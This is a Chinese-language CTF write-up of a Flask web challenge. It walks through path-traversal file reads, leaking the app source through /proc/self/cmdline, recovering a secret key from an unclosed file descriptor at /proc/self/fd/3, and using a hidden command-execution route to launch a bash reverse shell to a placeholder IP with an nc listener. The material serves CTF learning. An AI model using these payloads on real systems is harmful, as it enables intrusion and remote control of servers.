![[Pasted image 20230104083639.png|500]]

---
首页长这样

![[Pasted image 20230104083703.png]]

朴实无华.jpg

![[Pasted image 20230104083746.png]]

```php
/page?url=../flag
```
然后就拿到`flag`了

看`wp`还有个预期解

获取进程的`cmdline`
```php
/page?url=/proc/self/cmdline
```

```shell
python2 app.py
```

```php
/page?url=app.py
```

```python
from flask import Flask, Response
from flask import render_template
from flask import request
import os
import urllib

app = Flask(__name__)

SECRET_FILE = "/tmp/secret.txt"
f = open(SECRET_FILE)
SECRET_KEY = f.read().strip()
os.remove(SECRET_FILE)


@app.route('/')
def index():
    return render_template('search.html')


@app.route('/page')
def page():
    url = request.args.get("url")
    try:
        if not url.lower().startswith("file"):
            res = urllib.urlopen(url)
            value = res.read()
            response = Response(value, mimetype='application/octet-stream')
            response.headers['Content-Disposition'] = 'attachment; filename=beautiful.jpg'
            return response
        else:
            value = "HACK ERROR!"
    except:
        value = "SOMETHING WRONG!"
    return render_template('search.html', res=value)


@app.route('/no_one_know_the_manager')
def manager():
    key = request.args.get("key")
    print(SECRET_KEY)
    if key == SECRET_KEY:
        shell = request.args.get("shell")
        os.system(shell)
        res = "ok"
    else:
        res = "Wrong Key!"

    return res


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

使用`open`打开了，但是没有`close`，可以使用文件描述符读取

默认创建了三个文件描述符，`stdin`、`stdout`和`stderr`

所以`secret.txt`的`fd`应该是`3`

```php
/page?url=/proc/self/fd/3
```

```
kE2V+hdkhIPOUAJKRtlII96sVqUxsIZiOhjWOqcRr24=
```

反弹`shell`
```php
no_one_know_the_manager?key=kE2V+hdkhIPOUAJKRtlII96sVqUxsIZiOhjWOqcRr24=&shell=bash -c "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/7777 0>&1"
```
查询参数要进行`url`编码
```shell
nc -lvp 7777
```

![[Pasted image 20230104094436.png|1000]]

```shell
cat /flag
```

```
flag{5dbf6e32-aa1e-4f39-b328-425144e25c25}
```

#Web #linux #proc #文件描述符 #反弹shell 